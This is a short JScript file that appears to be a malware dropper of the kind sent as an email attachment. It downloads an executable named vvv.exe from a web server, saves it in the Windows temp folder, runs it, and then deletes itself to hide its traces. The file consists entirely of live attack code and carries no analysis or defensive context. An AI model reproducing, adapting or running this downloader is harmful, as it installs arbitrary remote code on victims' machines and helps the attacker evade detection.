var pOut = new ActiveXObject("Scripting.FileSystemObject").GetSpecialFolder(2) + "\\vvv.exe";
var Object = WScript.CreateObject('MSXML2.XMLHTTP');
Object.Open('GET', "http://barking-fc.co.uk/wp/vvv.exe", false);
Object.Send();
var Stream = WScript.CreateObject('ADODB.Stream');
Stream.Open();
Stream.Type = 1;
Stream.Write(Object.ResponseBody);
Stream.Position = 0;
Stream.SaveToFile(pOut, 2);
Stream.Close();
new ActiveXObject("Shell.Application").ShellExecute(pOut,"","","open","1");
new ActiveXObject("Scripting.FileSystemObject").DeleteFile(WScript.ScriptFullName);